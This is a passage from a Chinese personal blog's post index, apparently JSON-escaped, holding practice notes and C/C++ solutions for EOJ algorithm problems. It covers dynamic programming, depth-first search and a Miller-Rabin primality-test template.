2+2+2，2+2+1+1，2+1+1+1+1； 1+1+1+1+1+1。 例如，正整数 3 有如下 3 种不同的拆分 : 3; 2+1; 1+1+1。\n说明 # dp[i][j] 表示数 i 划分为 j 份的方案数。显然对任意 i，有 dp[i][1]=1。 当 i \u0026lt;j 时，不会出现新的划分方案，dp[i][j]=dp[i][j-1]; 当 i == j 时，新的划分方案只有一种，那就是原数本身划为一份（即 dp[i][1]），dp[i][j]=dp[i][j-1]+1; 当 i \u0026gt; j 时： (1) 每个划分数都小于 j，则总数 dp[i][j-1]; (2) 划分数中包含了 j，则需要从 i 中减去 j 再划分，总数 dp[i-j][j]; 所以状态转移方程 dp[i][j]=dp[i][j-1]+dp[i-j][j]。\n#include \u0026lt;cstdio\u0026gt; using namespace std; int dp[101][101]; int main(void) { int n, i, j; for (i = 1; i \u0026lt;= 100; ++i) dp[i][1] = 1; while(~scanf(\u0026#34;%d\u0026#34;, \u0026amp;n)){ for (i = 1; i \u0026lt;= n; ++i) for (j = 2; j \u0026lt;= n; ++j){ dp[i][j] = dp[i][j - 1]; if (i == j) ++dp[i][j]; else if(i\u0026gt; j) dp[i][j] += dp[i - j][j]; } printf(\u0026#34;%d\\n\u0026#34;, dp[n][n]); } return 0; } 3034 数字拆分 # 将一个正整数拆分为成 2 的幂的和，例如： 7=1+2+4 7=1+2+2+2 7=1+1+1+4 7=1+1+1+2+2 7=1+1+1+1+1+2 7=1+1+1+1+1+1+1 总共有六种不同的拆分方案。 再比如：4 可以拆分成：4 = 4，4 = 1 + 1 + 1 + 1，4 = 2 + 2，4 = 1 + 1 + 2。 函数 f(n) 表示 n 的不同拆分的方案数，例如 f(7)=6。 请编写程序，读入一个正整数 n (1≤n≤1000000)，输出 f(n)%1000000000。\n说明 # 如果 n 为奇数，那么每种划分只会相对于前一个偶数的划分各多出一个 1，因此划分数相等，dp[n]=dp[n-1]。 如果 n 为偶数，那么对于含有 1 的情况可以拿出 2 个 1 转化为 n-2 的情况，而对不含 1 的情况可以直接除以 2 变成 n/2 的情况，dp[n]=dp[n-2]+dp[n\u0026gt;\u0026gt;1]。\n#include \u0026lt;cstdio\u0026gt; #define MAX 1000000 #define mod 1000000000 int dp[1000001] = {0, 1, 2}; int main() { int cas, n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;cas); for (int i = 3; i \u0026lt;= 1000000; ++i){ if (i \u0026amp; 1) dp[i] = dp[i-1] % mod; else dp[i] = (dp[i-2] + dp[i\u0026gt;\u0026gt;1]) % mod; } for (int t = 0; t \u0026lt; cas; ++t){ scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); printf(\u0026#34;case #%d:\\n%d\\n\u0026#34;, t, dp[n]); } return 0; } 3029 不重复正整数 # 整数拆分是把一个正整数（简称为和数）拆分为一个或若干个指定正整数（简称为零数，通常不区别式中各零数的排列顺序）之和，这是一个有趣的计算问题。通常拆分式中的零数有重复和不重复（即拆分式中各零数互不相同）两种情况。 如果我们打算将一个给定的正整数 N（N≤50）拆分为若干个不重复的正整数（a1,a2,…,ai,…）（i≥1）之和，其中每个零数的取值不大于给定的正整数 M（M≤20），即 1≤ai≤M，请问共有多少种不同的拆分方案。\n说明 # 本质还是 01 背包，注意第二层循环倒序枚举，否则一个数可以取多次。 注：dp[j] += dp[j-i] 其实是 dp[j] = max(dp[j], dp[j-i]+dp[j]) 的简化形式。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main() { int cas, n, m, dp[55]; cin \u0026gt;\u0026gt; cas; for (int t = 0; t \u0026lt; cas; ++t) { cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; memset(dp, 0, sizeof(dp)); dp[0] = 1; for (int i = 1; i \u0026lt;= m; ++i) for (int j = n; j\u0026gt;= i; --j) dp[j] += dp[j-i]; printf(\u0026#34;case #%d:\\n%d\\n\u0026#34;, t, dp[n]); } return 0; } 2857 编辑距离 # 有两个字符串（仅有英文小写字母组成） A，B。我们可以通过一些操作将 A 修改成 B。操作有三种：1 修改一个字母，2 删除一个字母，3 插入一个字母。现在定义编辑距离为将 A 通过上述操作修改成 B 的最少次数。\n说明 # 有点像 LCS 的题，dp[i][j] 表示 a 的前 i 个字符转为 b 的前 j 个字符所需要的最少操作次数。 如果 a[i-1]==b[j-1] 那么不需要额外操作，dp[i][j]=dp[i-1][j-1]; 否则，我们可以选择：\n修改：dp[i][j]=dp[i-1][j-1]+1; 增加：dp[i][j]=dp[i][j-1]+1； 删除：dp[i][j]=dp[i-1][j]+1。 三者取 min。\n#include \u0026lt;cstdio\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;algorithm\u0026gt; #define INF 999999 using namespace std; int main() { int cas, i, j, lena, lenb, dp[501][501]; char a[501], b[501]; scanf(\u0026#34;%d\\n\u0026#34;, \u0026amp;cas); while(cas--) { gets(a); lena = strlen(a); gets(b); lenb = strlen(b); memset(dp, INF, sizeof(dp)); for (i = 0; i \u0026lt;= lena; ++i) dp[i][0] = i; for (j = 0; j \u0026lt;= lenb; ++j) dp[0][j] = j; for (i = 1; i \u0026lt;= lena; ++i) for (j = 1; j \u0026lt;= lenb; ++j){ dp[i][j] = min(dp[i-1][j] + 1, dp[i][j-1] + 1); dp[i][j] = min(dp[i][j], dp[i-1][j-1] + (a[i-1] != b[j-1])); } printf(\u0026#34;%d\\n\u0026#34;, dp[lena][lenb]); } return 0; } 1029 走道铺砖 # n*m 的走道铺满 1*2 的地砖，求铺设方案数。 1 \u0026lt;= N,M \u0026lt;= 11\n状压DP……\n我们知道这题中上一行的状态可以一定程度上决定下一行，且铺一块砖的方式只有两种：竖放和横放。 不妨用 1 1 表示横放的砖块，上 0 下 1 来表示竖放的砖块。为什么这样表示？\n横放砖块对下一行完全没有影响 竖放砖块的下半部分填充了下一行的一个格子。 竖放砖块的上半部分对下一行有影响：如果上一行某一位是 0，那么下一行这位只能是 1。 为了保证最后一行没有竖放的砖块，我们只需要保证最后一行都是 1。 用 dp[i][j] 表示第 i 行状态为 j 的方案数，那么 dp[n][2^m-1] 就是答案。 之后就是 bottom-up 过程了，值得注意的是有许多非法情况需要判断。\n例如第 i 行第 k 位已经是 0，那么 i-1 行对应位一定是 1，否则非法。如果合法继续检测 (i,k+1)。 (i,k)=1，那么继续分类： (i-1,k)=0，合法，继续检测 (i,k+1)。 (i-1,k)=1，则只可能是 (i,k+1)=(i-1,k+1)=1，否则非法。如果合法继续检测 (i,k+2)。 对于第一行： (0,k)=0，继续检测 (0,k+1)。 (0,k)=1，则 (0,k+1)=1，继续检测 (0,k+2)。 任意需要检测 (0,k+2) 且 k==m-1 的情况，都是非法的。 嗯，就这么多。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int maxrow = 11; const int maxstat = 1\u0026lt;\u0026lt;11; int h, w; long long dp[maxrow][maxstat]; inline bool first_ok(int stat) { for (int i = 0; i \u0026lt; w;) if (stat \u0026amp; (1\u0026lt;\u0026lt;i)) { if (i == w-1 || !(stat \u0026amp; (1\u0026lt;\u0026lt;(i+1))) ) return 0; i += 2; }else ++i; return 1; } inline bool judge(int a, int b) { for (int i = 0; i \u0026lt; w;) { if (!(a \u0026amp; (1\u0026lt;\u0026lt;i))) { if (!(b \u0026amp; (1\u0026lt;\u0026lt;i))) return 0; ++i; }else { if (!(b \u0026amp; (1\u0026lt;\u0026lt;i))) ++i; else if (i == w-1 || !(( a \u0026amp; (1\u0026lt;\u0026lt;(i+1)) ) \u0026amp;\u0026amp; (b \u0026amp; (1\u0026lt;\u0026lt;(i+1)) ))) return 0; else i += 2; } } return 1; } int main() { while (cin\u0026gt;\u0026gt; h \u0026gt;\u0026gt; w) { if (!h \u0026amp;\u0026amp; !w) break; if (w\u0026gt; h) swap(w, h); int all = 2 \u0026lt;\u0026lt;(w-1); memset(dp, 0, sizeof dp); for (int i = 0; i \u0026lt; all; ++i) if (first_ok(i)) dp[0][i] = 1; for (int i = 1; i \u0026lt; h; ++i) for (int j = 0; j \u0026lt; all; ++j) for (int k = 0; k \u0026lt; all; ++k) if (judge(j, k)) dp[i][j] += dp[i-1][k]; printf(\u0026#34;%lld\\n\u0026#34;, dp[h-1][all-1]); } return 0; } ","date":"2018-01-30","permalink":"/posts/dp-practice/","section":"Posts","summary":"\u003cp\u003e对我而言不那么简单的 DP 题目。\u003c/p\u003e","title":"DP 题练习记录"},{"content":"贴定理和模板的，不是教程。\n算法简介 # 首先是一些概念：\n费马小定理：对于素数 p 和任意整数 a，有 $a^p ≡ a(mod\\ p)$. 反之，对于一个数 p，如果满足 $a^p ≡ a(mod\\ p)$，则 p 很可能是素数。 伪素性测试：瞎猜若干个 x，只要不满足上式，那么 p 就不是素数。看起来没毛病了。 Carmichael 数：对于合数 n，如果对所有正整数 b（b 和 n 互素）都有 $b^{n-1}≡ 1 (mod\\ n)$ 成立，则合数 n 为 Carmichael 数。比如 561。这种数的存在使得上面的方法沦为 “伪素性测试”。 二次探测定理：如果 p 是奇素数，x 是小于 p 的正整数，则 $x^2 ≡ 1(mod\\ p)$ 的解为 $x = 1$ 或 $x = p - 1(mod\\ p)$，这是由模运算的循环特性导致的。 利用二次探测定理，只需要探测 s 次就可以将错误率降到 $2^{-s}$（好像是这样吧。。反正很低就对了），因此也不会多花多少时间。 记得判素时的细节处理以及快速幂取模。\n代码 # 很简洁的模板：\n#include \u0026lt;cstdio\u0026gt; using namespace std; typedef long long ll; ll prime[5] = {2, 3, 5, 233, 331}; ll pow_mod(ll a, ll n, ll mod) { ll ret = 1; while (n) { if (n \u0026amp; 1) ret = ret * a % mod; a = a * a % mod; n \u0026gt;\u0026gt;= 1; } return ret; } int miller_rabin(ll n) { if (n \u0026lt; 2 || (n != 2 \u0026amp;\u0026amp; !(n \u0026amp; 1))) return 0; ll s = n - 1; while (!(s \u0026amp; 1)) s \u0026gt;\u0026gt;= 1; for (int i = 0; i \u0026lt; 5; ++i) { if (n == prime[i]) return 1; ll t = s, m = pow_mod(prime[i], s, n); while (t != n - 1 \u0026amp;\u0026amp; m != 1 \u0026amp;\u0026amp; m != n - 1) { m = m * m % n; t \u0026lt;\u0026lt;= 1; } if (m != n - 1 \u0026amp;\u0026amp; !(t \u0026amp; 1)) return 0; } return 1; } int main() { ll n; while (~scanf(\u0026#34;%lld\u0026#34;, \u0026amp;n)) printf(\u0026#34;%s\\n\u0026#34;, miller_rabin(n) ? \u0026#34;YES\u0026#34; : \u0026#34;NO\u0026#34;); return 0; } ","date":"2018-01-19","permalink":"/posts/miller-rabin/","section":"Posts","summary":"\u003cp\u003e贴定理和模板的，不是教程。\u003c/p\u003e","title":"Miller-Rabin 素性测试与二次探测"},{"content":"题目全部来自 EOJ。新年开始用 C++ 了。\n1012 The 3n+1 Problem # 对一个数，如果是奇数则乘 3 加 1，是偶数则除以 2。重复直至变为 1，总操作次数记为 c。给定区间 [i,j]，求区间内最大可能取到的 c 的值。\n说明 # 按照题意，离线 DFS 即可。\n#include \u0026lt;stdio.h\u0026gt; #define MAX 1000000 int sum[MAX + 1], m, n; int dfs(long long k) { if (k \u0026lt;= MAX \u0026amp;\u0026amp; sum[k]) return sum[k]; int ans = 1; if (k % 2) ans += dfs(3 * k + 1); else ans += dfs(k / 2); if (k \u0026lt;= MAX) sum[k] = ans; return ans; } int main() { int i, j, k, max; sum[1] = 1; for (i = 2; i \u0026lt;= MAX; ++i) sum[i] = dfs(i); while(~scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;i, \u0026amp;j)){ printf(\u0026#34;%d %d\u0026#34;, i, j); if (i\u0026gt; j){int tmp = i; i = j; j = tmp;} max = 0; for (k = i; k \u0026lt;= j; ++k) if (sum[k] \u0026gt; max) max = sum[k]; printf(\u0026#34;%d\\n\u0026#34;, max); } return 0; } 1114 素数环 # 一个由自然数 1…n (n≤18) 素数环就是如下图所示，环上任意两个节点上数值之和为素数。 1 / \\ 4 2 \\ / 3 要求建立一个从 1 到 n 的素数环。\n说明 # 考虑到数据范围较小，我们先用 prime 数组存放素数。然后 DFS 与相邻数之和是否为素数，最后特判头和尾之和的情况。\n#include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int n, prime[50] = {0,0,1,1,0,1,0,1,0,0,0,1,0,1,0,0,0,1, 0,1,0,0,0,1,0,0,0,0,0,1,0,1,0,0,0,0,0,1,0,1,0,1,0,1,0}, vis[50], a[50] = {1}; void dfs(int now) { if (now == n \u0026amp;\u0026amp; prime[a[0]+a[n-1]]) { for (int i = 0; i \u0026lt; n - 1; ++i) printf(\u0026#34;%d\u0026#34;, a[i]); printf(\u0026#34;%d\\n\u0026#34;, a[n-1]); } else for (int i = 2; i \u0026lt;= n; ++i) if (!vis[i] \u0026amp;\u0026amp; prime[i+a[now-1]]) { a[now] = i; vis[i] = 1; dfs(now+1); vis[i] = 0; } } int main() { cin \u0026gt;\u0026gt; n; dfs(1); return 0; } 1130 n 皇后问题 # 利用回溯法计算 n*n 棋盘中摆放 n 个皇后的方案数。\n说明 # 规则是两个皇后不能在同一直线 / 斜线上。注意好 if 语句的条件以及行列关系。\n#include \u0026lt;cstdio\u0026gt; #include \u0026lt;cmath\u0026gt; using namespace std; int n, cnt, pos[10]; bool ok(int row) { for (int i = 0; i \u0026lt; row; ++i) if((pos[row] == pos[i]) || (abs(row-i) == abs(pos[row]-pos[i]))) return false; return true; } void queen(int row) { int col; if (row == n) ++cnt; else for (col = 0; col \u0026lt; n; ++col){ pos[row] = col; if (ok(row)) queen(row+1); } } int main() { int t; while(~scanf(\u0026#34;%d\u0026#34;, \u0026amp;t)){ while(t--){ cnt = 0; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); queen(0); printf(\u0026#34;%d\\n\u0026#34;, cnt); } } return 0; } 2457 Expressions # 给出后缀表达式，调换次序使得用队列计算所得结果与用栈计算相同。其中小写字母是操作数，大写字母是运算符。如：\nInput: 2 xyPzwIM abcABdefgCDEF Output: wzyxIPM gfCecbDdAaEBF 说明 # 从后往前读，遇到操作数就存入数组，遇到运算符就继续 DFS 两次（对应这一运算符的两个操作数）。最后倒序输出数组。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; string s; vector\u0026lt;string\u0026gt; v; int pos; void dfs(int d) { if (pos \u0026lt; 0) return; v[d] += s[pos--]; if (islower(s[pos+1])) return; dfs(d+1); dfs(d+1); } int main() { int t; cin \u0026gt;\u0026gt; t; while (t--) { cin \u0026gt;\u0026gt; s; v.assign(s.size(), \u0026#34;\u0026#34;); pos = s.size()-1; dfs(0); for (vector\u0026lt;string\u0026gt;::reverse_iterator it = v.rbegin(); it != v.rend(); ++it) cout \u0026lt;\u0026lt; *it; cout \u0026lt;\u0026lt; endl; } return 0; } 2856 仰望星空 # 用邻接矩阵的方式给出图，求图中八连通块个数。\n说明 # 各大 OJ 上都有的经典 DFS 入门题。 一种类似模板的写法（稍加改动可以求四连通块、最大连通块、次大连通块等等）： 遍历所有不为空的点，向四个方向 DFS 并把走过的地点标记为空。DFS 次数即为连通块个数。\n#include \u0026lt;cstdio\u0026gt; int row, col, a[1005][85]; void dfs(int x, int y) { a[x][y] = 0; for (int dx = -1; dx \u0026lt;= 1; ++dx) for (int dy = -1; dy \u0026lt;= 1; ++dy) { int nx = x + dx, ny = y + dy; if (0 \u0026lt;= nx \u0026amp;\u0026amp; nx \u0026lt; row \u0026amp;\u0026amp; 0 \u0026lt;= ny \u0026amp;\u0026amp; ny \u0026lt;= col \u0026amp;\u0026amp; a[nx][ny]) dfs(nx, ny); } } int main(void) { char tmp; int i, j; while(~scanf(\u0026#34;%d%d\\n\u0026#34;, \u0026amp;col, \u0026amp;row)){ int cnt = 0; for (i = 0; i \u0026lt; row; ++i){ for (j = 0; j \u0026lt; col; ++j){ scanf(\u0026#34;%c\u0026#34;, \u0026amp;tmp); if (tmp ==\u0026#39;*\u0026#39;) a[i][j] = 1; } getchar(); } for (i = 0; i \u0026lt; row; ++i) for (j = 0; j \u0026lt; col; ++j) if (a[i][j]){ dfs(i, j); ++cnt; } printf(\u0026#34;%d\\n\u0026#34;, cnt); } return 0; } 2859 表达式的个数 # 给定 123456789，在 数字中 添加 + 和 -，或者什么都不加，会得到一个表达式，当然你肯定会算这个表达式的值。然后如果给你这个表达式的值，你会求有多少个不同的表达式能够得到这个值呢？\n说明 # 由于本题数字特殊，可以用数字本身来移动要 DFS 的位置。位置确定后对加号减号分别 DFS。由于需要加在数字中，所以减号不能加在开头。\n#include \u0026lt;cstdio\u0026gt; #include \u0026lt;map\u0026gt; using namespace std; map\u0026lt;int, int\u0026gt; ans; typedef long long ll; void dfs(ll sum, int cnt) { if (cnt\u0026gt; 9){ ++ans[sum]; return; } ll ret = 0; for (int i = cnt; i \u0026lt;= 9; ++i){ ret = ret * 10 + i; dfs(sum + ret, i + 1); if (cnt\u0026gt; 1) dfs(sum - ret, i + 1); } } int main(void) { int n; dfs(0, 1); while(~scanf(\u0026#34;%d\u0026#34;, \u0026amp;n)) printf(\u0026#34;%d\\n\u0026#34;, ans[n]); return 0; } 2912 放书 # 在书架上放有编号为 1,2,…,n 的 n 本书。现将 n 本书全部取下然后再放回去，当放回去时要求每本书都不能放在原来的位置上。 例如 n=3 时：原来位置为：1,2,3。放回去时只能为：3,1,2 或 2,3,1 这两种。 对于每一个 n，求满足上面的条件的放法有多少？ 对于每组测试数据，如果 n\u0026lt;8，输出每种放法（每种放法占一行，放法按照字典序从小到大排列），如果 n\u0026gt;=8，只需要输出放法总数。\n说明 # 如果只需要输出放法总数，那么可以直接套用错排公式 D(n)=(n-1)[D(n-2)+D(n-1)] 或者 D(n)=[n!/e+0.5]。不过本题对于 n\u0026lt;8 的情况需要输出具体方法，所以依然得靠 DFS 来实现。\n#include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int v[11], a[11], n, cnt; void dfs(int d) { if (d == n+1) { if (n \u0026lt; 8) { for (int i = 1; i \u0026lt;= n; ++i) cout \u0026lt;\u0026lt;a[i]; cout \u0026lt;\u0026lt; endl; }else ++cnt; return; } for (int i = 1; i \u0026lt;= n; ++i) { if (!v[i]) { v[i] = 1; if (i != d) { if (n \u0026lt; 8) a[d] = i; dfs(d+1); } v[i] = 0; } } } int main() { int t; cin \u0026gt;\u0026gt; t; while (t--) { cin \u0026gt;\u0026gt; n; cnt = 0; memset(v, 0, sizeof(v)); dfs(1); if (n\u0026gt;= 8) cout \u0026lt;\u0026lt; cnt \u0026lt;\u0026lt; endl; } return 0; } 3279 爱狗狗的两个 dalao # n 只重量为 w1...wn 的狗装入载重为 M 的缆车，求最少需要多少缆车。 1\u0026lt;=n\u0026lt;=18 1\u0026lt;=M\u0026lt;=1e9\n说明 # 由于 M 较大，难以用上背包 DP，只能搜索来做。\n#include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int maxn = 20; int w[maxn], dp[maxn], n, m, ans; bool dfs(int x) { if (x\u0026gt; n) return 1; for (int i = 1; i \u0026lt;= x \u0026amp;\u0026amp; i \u0026lt;= ans; ++i) if (dp[i] + w[x] \u0026lt;= m) { dp[i] += w[x]; if(dfs(x+1)) return 1; dp[i] -= w[x]; } return 0; } int main() { cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; for (int i = 1; i \u0026lt;= n; ++i) cin \u0026gt;\u0026gt; w[i]; sort(w+1, w+n+1, greater\u0026lt;int\u0026gt;()); for (ans = 1; ans \u0026lt;= n; ++ans) { memset(dp, 0, sizeof(dp)); if (dfs(1)) break; } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; endl; return 0; } ","date":"2018-01-04","permalink":"/posts/dfs-simple/","section":"Posts","summary":"\u003cp\u003e题目全部来自 EOJ。新年开始用 C++ 了。\u003c/p\u003e","title":"简单 DFS 题合集"},{"content":"经典之所以能被称为经典，是因为其中蕴含的无限可能。\n1075 庆祝迎评成功 # 一个蛋糕切 n 刀，求最多可以切成几块。\n说明 # 对三维问题，降维处理不失为一种好方法。我们先考虑二维情况：\nn 条直线分割一个平面，最多可以分割成几块？ 假设 n-1 条直线已经确定（并且已经是最优解，下同），那么第 n 条直线需要与前 n-1 条直线交于 n-1 个不同的点，这使第 n 条直线被分为 n 份，平面则将被多分出 n 个区域。\n我们设二维情况的答案为 f(n)，则 f(n)=f(n-1)+n，推得通项公式 f(n)=1+n(n+1)/2。\n推广到三维，设此时答案为 s(n)。n-1 个平面已经确定，第 n 个平面需要与前 n-1 个平面有 n-1 条交线，这使第 n 个平面被分为 f(n-1) 份，空间则将被多分出 f(n-1) 个区域。我们得到：s(n)=s(n-1)+f(n-1)=s(n-1)+1+n(n-1)/2。\n边界条件为 s(0)=1。\n#include \u0026lt;stdio.h\u0026gt; int main(){ int a, i; long long s[1001]; s[0] = 1; for (i = 1; i \u0026lt; 1001; ++i) s[i] = s[i - 1] + i * (i - 1) / 2 + 1; while (scanf(\u0026#34;%d\u0026#34;, \u0026amp;a) \u0026amp;\u0026amp; a) printf(\u0026#34;%lld\\n\u0026#34;, s[a]); return 0; } 1015 核电站 # 一个核电站有 N 个放核物质的坑，坑排列在一条直线上。 如果连续 M 个坑中放入核物质，则会发生爆炸，于是，在某些坑中可能不放核物质。 任务：对于给定的 N 和 M，求不发生爆炸的放置核物质的方案总数。\n说明 # 设第 n 个坑不发生爆炸的方案数为 f(n)，我们假设前 n-1 个坑已经确定。分两种情况：\n已经有连续 m-1 个核物质，那么第 n 个坑只能不放核物质，且这 m-1 个坑前的那个坑也不能放核物质。方案数为 f((n-1)-(m-1)-1)=f(n-m-1)。 否则，第 n 个坑可以选择放或不放。方案数为 2*[f(n-1)-f(n-m-1)]。 边界条件 f(0)=1。\n具体计算时可以用 DP 的递推形式写，也可以像如下代码中用 2 的幂计算：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main(void) { int n, m, i; long long nuc[60]; nuc[0] = 1; while (~scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;n, \u0026amp;m)){ for (i = 1; i \u0026lt;= 50; ++i){ if (i \u0026lt; m) nuc[i] = (long long)pow(2, i); else if(i == m) nuc[i] = (long long)pow(2, m) - 1; else nuc[i] = 2 * nuc[i - 1] - nuc[i - m - 1]; } printf(\u0026#34;%I64d\\n\u0026#34;, nuc[n]); } return 0; } 这里不能预处理 nuc 数组，因为 m 未知。\n3267 足球锦标赛 # 计分板上的每一位都按顺序挂了 0 到 9 这 10 个牌子，所以可以表示 000 至 999。当其中一个队的得分从 010 变成 011 时，计分员只要将最后一位的最前面的牌子向后翻即可，共需翻动一块牌子；当得分从 019 变成 020 是，由于 9 后面已经没有牌子了，所以计分员要将 0 到 9 全部翻到前面，并将倒数第二位的牌子 1 翻到后面，所以共需翻动 10 块牌子。 现场的计分牌和图中所示还是存在差异的，现场的计分牌会很大，很重，所以翻每块牌子都要消耗 1 点体力。 你是计分员，现在比赛还剩下最后十分钟。现在有一个预言家告诉你在这十分钟里，双方得分共计多少；但他没有告诉你双方得分各是多少。所以你想要知道你要花费的体力值最多是多少。\n说明 # 先模拟翻牌，预处理记录体力的数组。然后枚举双方得分情况，求最大值。\n#include \u0026lt;stdio.h\u0026gt; int dp[1001]={0}; void init() { int i; for (i = 1; i \u0026lt;= 999; ++i){ if (i % 100 == 0) dp[i] = dp[i - 1] + 19; else if (i % 10 == 0) dp[i] = dp[i - 1] + 10; else dp[i] = dp[i - 1] + 1; } return; } int main(void) { int t, i, a, b, sc, j; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); init(); for (i = 1; i \u0026lt;= t; ++i){ scanf(\u0026#34;%3d %3d %d\u0026#34;, \u0026amp;a, \u0026amp;b, \u0026amp;sc); int ans = 0, now = 0; for (j = 0; j \u0026lt;= sc; ++j){ now = dp[a + j] - dp[a] + dp[b + sc - j] - dp[b]; if (now\u0026gt; ans) ans = now; } printf(\u0026#34;Case %d: %d\\n\u0026#34;, i, ans); } return 0; } 1052 0-1 背包问题 # 已知 n 个物体 1,2,3,…,n 与一个背包。物体 i 的重量为 Wi\u0026gt;0，价值为 Pi\u0026gt;0 (i=1,2,…,n)，背包容量为 M\u0026gt;0。 求在不超过背包容量的情况下，使得装进去的物体的价值最高。\n说明 # 经典入门 DP 题。用一维数组实现时需要注意 j 需要从 m 到 w 递减，这与动规的 bottom-up 思路是一致的。\n#include\u0026lt;stdio.h\u0026gt; int main() { int t; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); while(t--) { int n, m, i, j, w, v, a[100001] = {0}; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;n, \u0026amp;m); for(i = 0; i \u0026lt; n; ++i){ scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;w, \u0026amp;v); for(j = m; j\u0026gt;= w; --j) if (a[j - w] + v \u0026gt; a[j]) a[j] = a[j - w] + v; } printf(\u0026#34;%d\\n\u0026#34;,a[m]); } return 0; } 3302 打印 # 打印 n 个相同的字符，插入或删除一个字符花费的时间为 x，复制当前整个文本并且粘贴在后面的时间花费为 y，求完成 n 个字符的打印所需的最小花费时间。\n说明 # dp[i] 表示打印 i 个字符需要的最小时间。\ni 为偶数时，可能是 (i-1 个字符 + 插入一个字符) / (i/2 个字符复制一次) 两种操作之一产生的，取它们的最小值。 i 为奇数时，可能是 (i-1 个字符 + 插入一个字符) / ((i+1)/2 个字符复制一次) 两种操作之一产生的，取它们的最小值。 写的时候用的 C，还并不会定义宏，导致代码看起来比较繁琐。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;memory.h\u0026gt; typedef long long LL; LL dp[10000001]; LL printing(int n, int x, int y) { int i; if (n == 0) return 0; if (n == 1) return x; memset(dp, 0, sizeof(dp)); for (i = 1; i \u0026lt;= n; ++i){ if (i % 2) dp[i] = (dp[i-1]+x \u0026lt;dp[(i+1)/2]+y+x)?dp[i-1]+x:dp[(i+1)/2]+y+x; else dp[i] = (dp[i-1]+x \u0026lt;dp[i/2]+y)?dp[i-1]+x:dp[i/2]+y; } return dp[n]; } int main() { int n,x,y; scanf(\u0026#34;%d%d%d\u0026#34;,\u0026amp;n, \u0026amp;x, \u0026amp;y); LL ans = printing(n, x, y); printf(\u0026#34;%lld\u0026#34;, ans); return 0; } 数塔系列 # 最小和 # 从顶部出发，在每一结点可以选择向左走或是向右走，一直走到底层，要求找出一条路径，使路径上的数字和最小。\n自下向上更新每一层的最小值。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;memory.h\u0026gt; #define min(a, b) ((a) \u0026lt;(b) ? (a) : (b)) int dp[101], a[101][101]; int main(void) { int t, n, i, j; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); while(t--){ scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); memset(dp, 0, sizeof(dp)); for (i = 0; i \u0026lt; n; ++i) for (j = 0; j \u0026lt;= i; ++j) scanf(\u0026#34;%d\u0026#34;, \u0026amp;a[i][j]); for (i = n - 1; i\u0026gt;= 0; --i) for (j = 0; j \u0026lt;= i; ++j) dp[j] = min(dp[j], dp[j + 1]) + a[i][j]; printf(\u0026#34;%d\\n\u0026#34;, dp[0]); } return 0; } 最大和 # 从第一行的数开始，除了某一次可以走到下一行的任意位置外，每次都只能左下或右下走一格，直到走到最下行，把沿途经过的数全部加起来。如何走，使得这个和尽量大？\n数组多建一维，值只有 0 和 1，表示是否还有传送机会剩余。 对于每次更新，如果还有传送机会，考虑是否传送。用 maxn 记录第 n 层的最大值。这次没有额外用 dp 数组而是直接覆盖 a 数组。\n#include \u0026lt;cstdio\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; int a[502][502][2], maxn[502]; int main() { int t, n, i, j; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); while(t--){ scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); memset(maxn, 0, sizeof(maxn)); for (i = 1; i \u0026lt;= n; ++i) for (j = 1; j \u0026lt;= i; ++j){ scanf(\u0026#34;%d\u0026#34;, \u0026amp;a[i][j][0]); a[i][j][1] = a[i][j][0]; } for (j = 1; j \u0026lt;= n; ++j) maxn[n] = max(maxn[n], a[n][j][0]); for (i = n-1; i\u0026gt;= 1; --i) for (j = 1; j \u0026lt;= i; ++j){ a[i][j][0] += max(a[i+1][j][0], a[i+1][j+1][0]); maxn[i] = max(maxn[i], a[i][j][0]); a[i][j][1] += max(max(a[i+1][j][1], a[i+1][j+1][1]), maxn[i+1]); } printf(\u0026#34;%d\\n\u0026#34;, a[1][1][1]); } return 0; } 个位数最大和 # 从第一行的数开始，每次都只能左下或右下走一格，直到走到最下行，把沿途经过的数全部加起来。如何走，使得这个和的个位数尽量大？\n多建一维来记录个位数，最后枚举个位数即可。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;memory.h\u0026gt; int dp[101][101][11], a[101][101]; int main(void) { int t, n, i, j, k; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); while(t--){ memset(dp, 0, sizeof(dp)); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (i = 0; i \u0026lt; n; ++i) for (j = 0; j \u0026lt;= i; ++j) scanf(\u0026#34;%d\u0026#34;, \u0026amp;a[i][j]); for (i = 0; i \u0026lt; n; ++i) dp[n - 1][i][a[n - 1][i] % 10] = 1; for (i = n - 2; i\u0026gt;= 0; --i) for (j = 0; j \u0026lt;= i; ++j) for (k = 0; k \u0026lt; 10; ++k) if (dp[i + 1][j][k] || dp[i + 1][j + 1][k]) dp[i][j][(k + a[i][j]) % 10] = 1; for (i = 9; i\u0026gt;= 0; --i) if (dp[0][0][i]){printf(\u0026#34;%d\\n\u0026#34;, i); break;} } return 0; } 个位数最大积 # 从第一行的数开始，每次都只能左下或右下走一格，直到走到最下行，把沿途经过的数全部乘起来。如何走，使得个位数的积尽量大 